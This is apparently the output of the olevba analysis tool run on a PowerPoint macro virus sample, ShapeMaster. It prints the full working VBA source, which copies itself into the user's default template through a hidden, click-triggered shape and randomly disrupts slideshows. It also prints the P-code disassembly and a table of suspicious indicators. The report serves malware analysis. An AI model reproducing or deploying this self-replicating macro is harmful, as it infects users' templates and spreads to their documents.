olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.ShapeMaster.ppt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ShapeMaster.vba 
in file: Virus.MSPPoint.ShapeMaster.ppt - OLE stream: 'VBA/ShapeMaster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'PPT.ShapeMaster v0.1 /1nternal
Sub actionhook(ShapeMaster)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        Prev = 1
        Do
            Last = Prev
            Prev = InStr(Last + 1, Application.Path, "\")
        Loop While Prev <> 0
        Set templa = Presentations.Open(Left(Application.Path, Last) + "Templates\Blank Presentation.pot", , , msoFalse)
        dontadd = False
        For Each ModComponent In templa.VBProject.VBComponents
            If ModComponent.Name = "ShapeMaster" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = templa.VBProject.VBComponents.Add(1)
            NewMod.Name = "ShapeMaster"
            NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("ShapeMaster").CodeModule.Lines(1, Home.VBProject.VBComponents("ShapeMaster").CodeModule.CountOfLines)
            Set ShapetoWack = templa.SlideMaster.Shapes.AddShape(1, 0, 0, templa.PageSetup.SlideWidth, templa.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "ShapeMaster"
                .ZOrder (msoSendToBack)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(ppMouseClick).Action = ppActionRunMacro
                .ActionSettings(ppMouseClick).Run = "actionhook"
            End With
            templa.Save
        End If
        templa.Close
    End If
    If Int(Rnd * 10) = 0 Then
        ActivePresentation.SlideShowWindow.View.Previous
        If Int(Rnd * 5) = 0 Then MsgBox ("PPT.ShapeMaster v0.1 /1nternal")
    Else
        ActivePresentation.SlideShowWindow.View.Next
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSPPoint.ShapeMaster.ppt
' ===============================================================================
' Module streams:
' VBA/ShapeMaster - 4813 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000F "<!--1nternal-->"
' Line #1:
' 	QuoteRem 0x0000 0x001E "PPT.ShapeMaster v0.1 /1nternal"
' Line #2:
' 	FuncDefn (Sub actionhook(ShapeMaster))
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	SetStmt 
' 	Ld ActivePresentation 
' 	Set Home 
' Line #6:
' 	LitDI2 0x0001 
' 	St Prev 
' Line #7:
' 	Do 
' Line #8:
' 	Ld Prev 
' 	St Last 
' Line #9:
' 	Ld Last 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	FnInStr3 
' 	St Prev 
' Line #10:
' 	Ld Prev 
' 	LitDI2 0x0000 
' 	Ne 
' 	LoopWhile 
' Line #11:
' 	SetStmt 
' 	Ld Application 
' 	MemLd Path 
' 	Ld Last 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0020 "Templates\Blank Presentation.pot"
' 	Add 
' 	ParamOmitted 
' 	ParamOmitted 
' 	Ld msoFalse 
' 	Ld Presentations 
' 	ArgsMemLd Option 0x0004 
' 	Set templa 
' Line #12:
' 	LitVarSpecial (False)
' 	St dontadd 
' Line #13:
' 	StartForVariable 
' 	Ld ModComponent 
' 	EndForVariable 
' 	Ld templa 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #14:
' 	Ld ModComponent 
' 	MemLd New 
' 	LitStr 0x000B "ShapeMaster"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St dontadd 
' 	EndIf 
' Line #15:
' 	StartForVariable 
' 	Next 
' Line #16:
' 	Ld dontadd 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld templa 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set NewMod 
' Line #18:
' 	LitStr 0x000B "ShapeMaster"
' 	Ld NewMod 
' 	MemSt New 
' Line #19:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000B "ShapeMaster"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000B "ShapeMaster"
' 	Ld Home 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NewMod 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld templa 
' 	MemLd PageSetup 
' 	MemLd SlideWidth 
' 	Ld templa 
' 	MemLd PageSetup 
' 	MemLd SlideHeight 
' 	Ld templa 
' 	MemLd SlideMaster 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	Set ShapetoWack 
' Line #21:
' 	StartWithExpr 
' 	Ld ShapetoWack 
' 	With 
' Line #22:
' 	LitStr 0x000B "ShapeMaster"
' 	MemStWith New 
' Line #23:
' 	Ld msoSendToBack 
' 	Paren 
' 	ArgsMemCallWith ZOrder 0x0001 
' Line #24:
' 	LitVarSpecial (False)
' 	MemLdWith Like 
' 	MemSt Visible 
' Line #25:
' 	LitVarSpecial (False)
' 	MemLdWith Fill 
' 	MemSt Visible 
' Line #26:
' 	Ld ppActionRunMacro 
' 	Ld ppMouseClick 
' 	ArgsMemLdWith ActionSettings 0x0001 
' 	MemSt Action 
' Line #27:
' 	LitStr 0x000A "actionhook"
' 	Ld ppMouseClick 
' 	ArgsMemLdWith ActionSettings 0x0001 
' 	MemSt Run 
' Line #28:
' 	EndWith 
' Line #29:
' 	Ld templa 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld templa 
' 	ArgsMemCall Close 0x0000 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	Ld ActivePresentation 
' 	MemLd SlideShowWindow 
' 	MemLd View 
' 	ArgsMemCall Previous 0x0000 
' Line #35:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001E "PPT.ShapeMaster v0.1 /1nternal"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	Ld ActivePresentation 
' 	MemLd SlideShowWindow 
' 	MemLd View 
' 	ArgsMemCall Not 0x0000 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

